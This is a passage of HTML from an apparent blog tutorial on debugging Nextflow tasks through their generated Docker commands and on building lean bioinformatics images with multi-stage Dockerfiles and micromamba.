</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  community.wave.seqera.io/library/ensembl-vep:115.2--90ec797ecb088e9a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  /bin/bash </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/work/fe/949a78b06c5fd8284aeb2f87d14f7d/.command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 5. Check the exit code</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .exitcode</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 6. View any error logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.err  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (if exists)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.out  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (if exists)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 7. If you run on HPC, (e.g SLURM ), run submit job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 8. You can debug manually by running container interactively</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your container</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 9. Modify .command.sh then inside your container, start to debug by running command directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> .command.sh</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-nextflow-docker-features">Key Nextflow Docker Features<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#key-nextflow-docker-features" class="hash-link" aria-label="Direct link to Key Nextflow Docker Features" title="Direct link to Key Nextflow Docker Features" translate="no">​</a></h4>
<table><thead><tr><th>Feature</th><th>How Nextflow Uses It</th></tr></thead><tbody><tr><td><strong>Resource limits</strong></td><td><code>--cpus</code> and <code>--memory</code> directives → <code>--cpu-shares</code> and <code>--memory</code> flags</td></tr><tr><td><strong>Volume mounts</strong></td><td>Pipeline inputs/outputs → <code>-v</code> flags</td></tr><tr><td><strong>User permissions</strong></td><td>Current user → <code>-u $(id -u):$(id -g)</code></td></tr><tr><td><strong>Work directory</strong></td><td>Task-specific directory → <code>-w "$NXF_TASK_WORKDIR"</code></td></tr><tr><td><strong>Container cleanup</strong></td><td>Automatic removal → <code>docker rm</code> commands</td></tr><tr><td><strong>Environment variables</strong></td><td>Pipeline configuration → <code>-e</code> flags</td></tr></tbody></table>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="profiling-and-optimization">Profiling and Optimization<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#profiling-and-optimization" class="hash-link" aria-label="Direct link to Profiling and Optimization" title="Direct link to Profiling and Optimization" translate="no">​</a></h4>
<p>By examining the actual Docker commands, you can:</p>
<ol>
<li class="">
<p><strong>Check resource allocation:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"cpu-shares\|memory"</span><span class="token plain"> work/*/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">/.command.run</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Verify mounted volumes:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"\-v"</span><span class="token plain"> work/ab/abc123*/.command.run</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>See container images being used:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker run"</span><span class="token plain"> work/*/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">/.command.run </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-oE</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"image:[^ ]+"</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Profile task execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check how long each task took</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">dir</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> work/*/*/*/.command.trace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Task: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">dirname</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> $dir</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$dir</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary">Summary<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary" translate="no">​</a></h3>
<ul>
<li class="">Nextflow automatically generates Docker commands for each task</li>
<li class="">Task commands are stored in <code>work/&lt;task-id&gt;/.command.run</code></li>
<li class="">You can inspect and manually re-run failed tasks</li>
<li class="">Understanding these commands helps with debugging and optimization</li>
<li class="">Resource limits from Nextflow directives are converted to Docker flags</li>
<li class="">Each task runs in isolation with its own work directory</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-efficient-docker-container-building-for-bioinformatics">3. Efficient Docker Container Building for Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#3-efficient-docker-container-building-for-bioinformatics" class="hash-link" aria-label="Direct link to 3. Efficient Docker Container Building for Bioinformatics" title="Direct link to 3. Efficient Docker Container Building for Bioinformatics" translate="no">​</a></h2>
<p>Building efficient Docker containers keeps your images fast to download, runs, and easy to share.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices">Best Practices<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#best-practices" class="hash-link" aria-label="Direct link to Best Practices" title="Direct link to Best Practices" translate="no">​</a></h3>
<ul>
<li class="">
<p><strong>Start with a lightweight, official base image</strong></p>
<ul>
<li class="">Alpine, Debian-slim, Ubuntu LTS</li>
</ul>
</li>
<li class="">
<p><strong>Install only required tools</strong></p>
<ul>
<li class="">Don't add extra utilities or unnecessary packages</li>
</ul>
</li>
<li class="">
<p><strong>Clean cache and remove temp files</strong></p>
<ul>
<li class="">In the same RUN step: <code>rm -rf /var/lib/apt/lists/*</code></li>
</ul>
</li>
<li class="">
<p><strong>Use multi-stage builds for large or compiled tools</strong></p>
<ul>
<li class="">Build from source in a builder stage, copy binaries into a slim final image</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="minimal-example-install-a-tool">Minimal Example: Install a Tool<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#minimal-example-install-a-tool" class="hash-link" aria-label="Direct link to Minimal Example: Install a Tool" title="Direct link to Minimal Example: Install a Tool" translate="no">​</a></h3>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    apt-get install -y --no-install-recommends samtools &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="multi-stage-build-example-build-from-source">Multi-Stage Build Example: Build from Source<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#multi-stage-build-example-build-from-source" class="hash-link" aria-label="Direct link to Multi-Stage Build Example: Build from Source" title="Direct link to Multi-Stage Build Example: Build from Source" translate="no">​</a></h3>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04 </span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">AS</span><span class="token instruction"> builder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y build-essential wget</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> wget https://github.com/samtools/samtools/releases/download/1.18/samtools-1.18.tar.bz2 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    tar -xjf samtools-1.18.tar.bz2 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    cd samtools-1.18 &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    ./configure --prefix=/usr/local &amp;&amp; make &amp;&amp; make install</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; apt-get install -y --no-install-recommends libbz2-1.0 liblzma5 zlib1g</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--from</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">builder</span><span class="token instruction"> /usr/local/bin/samtools /usr/local/bin/</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="further-optimizations">Further Optimizations<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#further-optimizations" class="hash-link" aria-label="Direct link to Further Optimizations" title="Direct link to Further Optimizations" translate="no">​</a></h3>
<ul>
<li class="">Sort package lists alphabetically</li>
<li class="">Use <code>.dockerignore</code> to reduce build context size</li>
<li class="">Pin exact tool/package versions for reproducibility</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-building-docker-images-with-conda-and-micromamba">4. Building Docker Images with Conda and Micromamba<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#4-building-docker-images-with-conda-and-micromamba" class="hash-link" aria-label="Direct link to 4. Building Docker Images with Conda and Micromamba" title="Direct link to 4. Building Docker Images with Conda and Micromamba" translate="no">​</a></h2>
<p>Building Docker containers from Conda packages is one of the most efficient ways to create reproducible bioinformatics environments. Micromamba is a lightweight, faster alternative to Conda that's perfect for containers.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-micromamba-for-docker-images">Why Micromamba for Docker Images?<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#why-micromamba-for-docker-images" class="hash-link" aria-label="Direct link to Why Micromamba for Docker Images?" title="Direct link to Why Micromamba for Docker Images?" translate="no">​</a></h3>
<p>Micromamba offers significant advantages over traditional Conda:</p>
<ul>
<li class=""><strong>Fast:</strong> 10-100x faster dependency resolution than Conda</li>
<li class=""><strong>Lightweight:</strong> Minimal footprint, perfect for containerized deployments</li>
<li class=""><strong>Reproducible:</strong> Environment lock files guarantee exact versions</li>
<li class=""><strong>Production-ready:</strong> Used extensively in bioinformatics pipelines</li>
<li class=""><strong>Small base image:</strong> Official <code>mambaorg/micromamba</code> image is only ~150MB</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-modern-approach-condayml--micromamba">The Modern Approach: Conda.yml + Micromamba<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-modern-approach-condayml--micromamba" class="hash-link" aria-label="Direct link to The Modern Approach: Conda.yml + Micromamba" title="Direct link to The Modern Approach: Conda.yml + Micromamba" translate="no">​</a></h3>
<p>Instead of writing complex RUN commands with inline package specifications, use a <code>conda.yml</code> environment file:</p>
<p><strong>conda.yml:</strong></p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">channels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">dependencies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">fastqc=0.12.1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">samtools=1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> bioconda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">bwa=0.7.17</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> conda</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">forge</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">procps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">ng</span><br></span></code></pre></div></div>
<p><strong>Dockerfile:</strong></p>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> mambaorg/micromamba:1.5.10-noble</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy environment file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">COPY</span><span class="token instruction"> </span><span class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chown</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">$MAMBA_USER:$MAMBA_USER</span><span class="token instruction"> conda.yml /tmp/conda.yml</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install packages from environment file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba install -y -n base -f /tmp/conda.yml </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; micromamba clean -a -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Export explicit lock file for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> micromamba env export --name base --explicit &gt; environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&gt;&gt; CONDA_LOCK_START"</span><span class="token instruction"> </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; cat environment.lock </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    &amp;&amp; echo </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"&lt;&lt; CONDA_LOCK_END"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set PATH</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">USER</span><span class="token instruction"> root</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"$MAMBA_ROOT_PREFIX/bin:$PATH"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
